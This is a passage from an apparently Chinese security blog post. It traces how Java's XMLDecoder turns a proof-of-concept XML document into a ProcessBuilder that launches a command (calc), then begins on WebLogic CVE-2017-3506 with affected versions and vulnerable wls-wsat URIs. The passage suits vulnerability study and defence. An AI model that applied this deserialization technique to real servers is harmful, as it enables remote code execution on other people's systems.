<span class="comment">//System.out.println(&quot;here in before calling next&quot;);</span></span><br><span class="line">        event = next();</span><br><span class="line">        <span class="comment">//System.out.println(&quot;here in after calling next&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(event == XMLStreamConstants.END_DOCUMENT) &#123;</span><br><span class="line">        fDocumentHandler.endDocument(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// scanDocument(boolean):boolean</span></span><br></pre></td></tr></table></figure>

<p>这个函数是扫描xml文档的一个方法，逐个标签读取，同时会读取到换行符<br>对于以上poc，解析流程为：714 14 14 14 14(cmd) 24 24 14 14(&#x2F;C) 24 24 14 14(calc) 24 24 24 124 28<br>这里的关键逻辑都在next中<br>比如在解析<code>&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</code>时，函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">addAttribute:<span class="number">84</span>, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">addAttribute:<span class="number">102</span>, ObjectElementHandler (com.sun.beans.decoder)</span><br><span class="line">startElement:<span class="number">294</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">startElement:<span class="number">509</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">scanStartElement:<span class="number">1364</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">2787</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">606</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">510</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">848</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">777</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">1213</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">643</span>, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">327</span>, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">run:<span class="number">375</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">372</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">doIntersectionPrivilege:<span class="number">76</span>, ProtectionDomain$JavaSecurityAccessImpl (java.security)</span><br><span class="line">parse:<span class="number">372</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">201</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">run:<span class="number">199</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">parsingComplete:<span class="number">199</span>, XMLDecoder (java.beans)</span><br><span class="line">readObject:<span class="number">250</span>, XMLDecoder (java.beans)</span><br><span class="line">main:<span class="number">11</span>, XmlDecoderTest (XmlDecoder)</span><br></pre></td></tr></table></figure>

<p>从next开始，首先进入XMLDocumentScannerImpl类的next方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line">    <span class="keyword">return</span> fDriver.next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的fDriver是XMLDocumentScannerImpl对象，接下来到XMLDocumentFragmentScannerImpl的next方法<br>这个方法比较长。主要是根据fScannerState参数来选择对应的case<br>这里进入这个case</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_START_ELEMENT_TAG :&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//xxx this function returns true when element is empty.. can be linked to end element event.</span></span><br><span class="line">    <span class="comment">//returns true if the element is empty</span></span><br><span class="line">    <span class="comment">// 扫描</span></span><br><span class="line">    fEmptyElement = scanStartElement() ;</span><br><span class="line">    <span class="comment">//if the element is empty the next event is &quot;end element&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(fEmptyElement)&#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_END_ELEMENT_TAG);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//set the next possible state</span></span><br><span class="line">        setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> XMLEvent.START_ELEMENT ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XMLDocumentFragmentScannerImpl类的scanStartElement方法主要作用是解析标签及其属性<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816175350.png"><br>来到AbstractSAXParser类的startElement方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fContentHandler.startElement(uri, localpart, element.rawname,</span><br><span class="line">                                             fAttributesProxy);</span><br></pre></td></tr></table></figure>

<p>进入这句，fContentHandler为DocumentHandler，进入DocumentHandler的startElement方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">    <span class="type">ElementHandler</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.handler;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个新的ElementHandler实例，并通过反射设置其所有者和父级处理器</span></span><br><span class="line">        <span class="built_in">this</span>.handler = (ElementHandler)<span class="built_in">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">        <span class="built_in">this</span>.handler.setOwner(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.handler.setParent(var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SAXException</span>(var10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历属性列表，并将属性添加到当前处理器中</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> var4.getQName(var6);</span><br><span class="line">            <span class="type">String</span> <span class="variable">var8</span> <span class="operator">=</span> var4.getValue(var6);</span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleException(var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.handler.startElement();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816214212.png"><br>这里的this.handler指的是VoidElementHandler对象<br>可以进入getElementHandler函数，此时的var1是void</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">ElementHandler</span>&gt; getElementHandler(String var1) &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> (Class)<span class="built_in">this</span>.handlers.get(var1);</span><br><span class="line">    <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported element: &quot;</span> + var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816223029.png"><br>所以最后得到的this.handler是VoidElementHandler对象对象<br>继续往下跟，来到ObjectElementHandler的addAttribute方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String var1, String var2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.equals(<span class="string">&quot;idref&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.idref = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;field&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.field = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.index = Integer.valueOf(var2);</span><br><span class="line">        <span class="built_in">this</span>.addArgument(<span class="built_in">this</span>.index);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;property&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.property = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1.equals(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.method = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 进入到这里</span></span><br><span class="line">        <span class="built_in">super</span>.addAttribute(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的var1是”class”，var2是”java.lang.ProcessBuilder”<br>进入父类的addAttribute方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String var1, String var2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.equals(<span class="string">&quot;class&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 通过反射生成var2对应的对象</span></span><br><span class="line">        <span class="built_in">this</span>.type = <span class="built_in">this</span>.getOwner().findClass(var2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230816215928.png"><br>也可以进去看看，this.getOwner()得到的是DocumentHandler对象，调用其findClass方法，该方法中又调用ClassFinder.resolveClass方法，其方法中调用了ClassFinder.findClass方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; findClass(String var0, ClassLoader var1) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    ReflectUtil.checkPackageAccess(var0);</span><br><span class="line">    <span class="keyword">if</span> (var1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// var0是类名，通过反射获取类</span></span><br><span class="line">            <span class="keyword">return</span> Class.forName(var0, <span class="literal">false</span>, var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用重载方法，作用也是一样</span></span><br><span class="line">    <span class="keyword">return</span> findClass(var0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他元素的解析流程大致类似<br>再来看看字符串是如何解析的，如下面这句</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先解析<code>&lt;string&gt;</code>标签，创建StringElementHandler对象<br>然后再解析calc字符串<br>进入到对应的case中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> XMLStreamConstants.CHARACTERS :</span><br><span class="line">    fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>进入fDocumentHandler.characters方法，这里传入的是calc字符串。此时的fDocumentHandler的handler参数是之前在解析<code>&lt;string&gt;</code>标签时创建StringElementHandler对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817111448.png"><br>继续进入characters方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817112014.png"><br>这里的var1正是poc字符，var2标识calc字符串的偏移，var3表示字符串的长度<br>this.handler是StringElementHandler对象，进入其addCharacter方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817112341.png"><br>经过4次循环，将calc字符串添加到StringElementHandler对象的sb属性中<br>至此，字符串的解析完成</p>
<p>再来看看最后一句的解析，这也触发了命令执行</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>逐步调试，前面部分的流程和其他标签处理方法一致，进入ObjectElementHandler的getValueObject方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title function_">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.field != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果存在字段（field），则通过FieldElementHandler获取上下文Bean（contextBean）中字段的值，并创建一个ValueObjectImpl实例返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="built_in">this</span>.getContextBean(), <span class="built_in">this</span>.field));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.idref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果存在idref，则通过getVariable方法获取变量的值，并创建一个ValueObjectImpl实例返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(<span class="built_in">this</span>.getVariable(<span class="built_in">this</span>.idref));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="built_in">this</span>.getContextBean();</span><br><span class="line">        String var4;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.index != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在索引（index），根据var2的长度确定是设置方法还是获取方法</span></span><br><span class="line">            var4 = var2.length == <span class="number">2</span> ? <span class="string">&quot;set&quot;</span> : <span class="string">&quot;get&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.property != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在属性（property），根据var2的长度确定是设置方法还是获取方法，并根据属性名构造对应的方法名</span></span><br><span class="line">            var4 = var2.length == <span class="number">1</span> ? <span class="string">&quot;set&quot;</span> : <span class="string">&quot;get&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="built_in">this</span>.property.length()) &#123;</span><br><span class="line">                var4 = var4 + <span class="built_in">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="built_in">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果存在方法（method），则使用指定的方法名，否则使用默认的&quot;new&quot;方法名</span></span><br><span class="line">            var4 = <span class="built_in">this</span>.method != <span class="literal">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="built_in">this</span>.method.length() ? <span class="built_in">this</span>.method : <span class="string">&quot;new&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建一个Expression实例，用于调用指定的方法，并获取返回值</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(var3, var4, var2);</span><br><span class="line">        <span class="comment">// 创建一个ValueObjectImpl实例，将Expression的返回值包装为ValueObjectImpl，并返回</span></span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先进入NewElementHandler类的getContextBean方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">getContextBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.type != <span class="literal">null</span> ? <span class="built_in">this</span>.type : <span class="built_in">super</span>.getContextBean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的type为空，所以需要进入父类的getContextBean方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170117.png"><br>其实根据poc的结构也知道，这里的父类就是type为ProcessBuilder对应的VoidElementHandler对象<br>此时继续进入父类的getValueObject方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170529.png"><br>进入重载方法，同样先调用getContextBean()，由于此时type不为空，所以返回type<br>接着对于方法而言，由于方法为空，所以设置为new<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817170950.png"><br>这里相当于创建一个ProcessBuilder对象<br>继续回到解析<code>&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</code>的getValueObject方法，此时的var3经过getContextBean处理后的是ProcessBuilder对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230817171635.png"><br>最后一行，调用了ProcessBuilder对象的start方法，命令执行成功<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">getValue:<span class="number">157</span>, Expression (java.beans)</span><br><span class="line">getValueObject:<span class="number">166</span>, ObjectElementHandler (com.sun.beans.decoder)</span><br><span class="line">getValueObject:<span class="number">123</span>, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">169</span>, ElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">318</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:<span class="number">609</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">emptyElement:<span class="number">183</span>, AbstractXMLDocumentParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">scanStartElement:<span class="number">1344</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">2787</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">606</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">510</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">848</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">777</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">1213</span>, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">643</span>, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">327</span>, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">run:<span class="number">375</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">372</span>, DocumentHandler$<span class="number">1</span> (com.sun.beans.decoder)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">doIntersectionPrivilege:<span class="number">76</span>, ProtectionDomain$JavaSecurityAccessImpl (java.security)</span><br><span class="line">parse:<span class="number">372</span>, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">run:<span class="number">201</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">run:<span class="number">199</span>, XMLDecoder$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">parsingComplete:<span class="number">199</span>, XMLDecoder (java.beans)</span><br><span class="line">readObject:<span class="number">250</span>, XMLDecoder (java.beans)</span><br><span class="line">main:<span class="number">11</span>, XmlDecoderTest (XmlDecoder)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Expression这个类,该类主要作用是动态调用指定对象的methodName方法.</p>
</blockquote>
<p><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/108754274">XMLDecoder反序列化漏洞源码分析 - 知乎 (zhihu.com)</a></p>
<h3 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h3><p><strong>影响范围</strong>：<br>WebLogic 10.3.6.0<br>WebLogic 12.1.3.0<br>WebLogic 12.2.1.0<br>WebLogic 12.2.1.1<br>WebLogic 12.2.1.2<br>CVE-2017-10271也是一致</p>
<p>默认受到影响的uri：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：<br>原理大致和下面CVE-2017-10271一致<br><strong>补丁分析</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span 